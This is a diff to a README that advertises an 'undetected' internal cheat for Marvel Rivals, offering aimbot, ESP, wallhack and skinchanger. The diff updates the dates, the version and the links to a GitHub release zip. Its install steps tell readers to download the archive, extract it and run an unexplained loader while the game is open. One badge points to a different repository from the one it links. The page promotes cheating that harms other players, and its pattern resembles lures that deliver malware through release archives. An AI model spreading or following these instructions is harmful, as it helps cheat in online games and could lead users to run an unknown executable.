@@ -1,11 +1,11 @@
-# Marvel Rivals Internal Hack (Aug-17, Undetected)
+# Marvel Rivals Internal Hack (Aug-19, Undetected)
 
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/vergemediatorcheer/MarvelRivals-CheatMenu/releases/download/1.0.5/Rivals.v1.0.5.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1.0.5-blue?style=for-the-badge)](https://github.com/vergemediatorcheer/MarvelRivals-CheatMenu/releases/download/1.0.5/Rivals.v1.0.5.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/vergemediatorcheer/MarvelRivals-Cheat-Menu/releases/download/1.0.6/Rivals.v1.0.6.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.0-blue?style=for-the-badge)](https://github.com/vergemediatorcheer/MarvelRivals-Cheat-Menu/releases/download/1.0.6/Rivals.v1.0.6.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/boggymc/MarvelRivals-DMA?style=for-the-badge&logo=github)](https://github.com/vergemediatorcheer/MarvelRivals-CheatMenu/stargazers)
-[![C++](https://img.shields.io/badge/Built%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/vergemediatorcheer/MarvelRivals-CheatMenu)
+[![Stars](https://img.shields.io/github/stars/boggymc/MarvelRivals-DMA?style=for-the-badge&logo=github)](https://github.com/vergemediatorcheer/MarvelRivals-Cheat-Menu/stargazers)
+[![C++](https://img.shields.io/badge/Built%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/vergemediatorcheer/MarvelRivals-Cheat-Menu)
 
 
 _A feature-rich internal cheat for Marvel Rivals_
@@ -13,7 +13,7 @@ _A feature-rich internal cheat for Marvel Rivals_
 Check the features list below.
 
 ---
-![Marvel Rivals Cheat Aimbot, ESP, Wallhack, Skinchanger](https://github.com/vergemediatorcheer/MarvelRivals-CheatMenu/blob/main/assets/image.png)
+![Marvel Rivals Cheat Aimbot, ESP, Wallhack, Skinchanger](https://github.com/vergemediatorcheer/MarvelRivals-Cheat-Menu/blob/main/assets/image.png)
 
 ## Features
 
@@ -51,8 +51,8 @@ Check the features list below.
 ---
 
 ## How to Install
-1. Download [the latest release archive](https://github.com/vergemediatorcheer/MarvelRivals-CheatMenu/releases/download/1.0.5/Rivals.v1.0.5.zip).
-2. Extract the contents to any folder (e.g., `C:\Rivalzh00k`).
+1. Download [the latest release archive](https://github.com/vergemediatorcheer/MarvelRivals-Cheat-Menu/releases/download/1.0.6/Rivals.v1.0.6.zip).
+2. Extract the contents to any folder (e.g., `C:\Rivalz_h00k`).
 3. Launch Marvel Rivals.
 4. Run the loader.
 5. Done. Press the menu toggle key (default: `INSERT`).
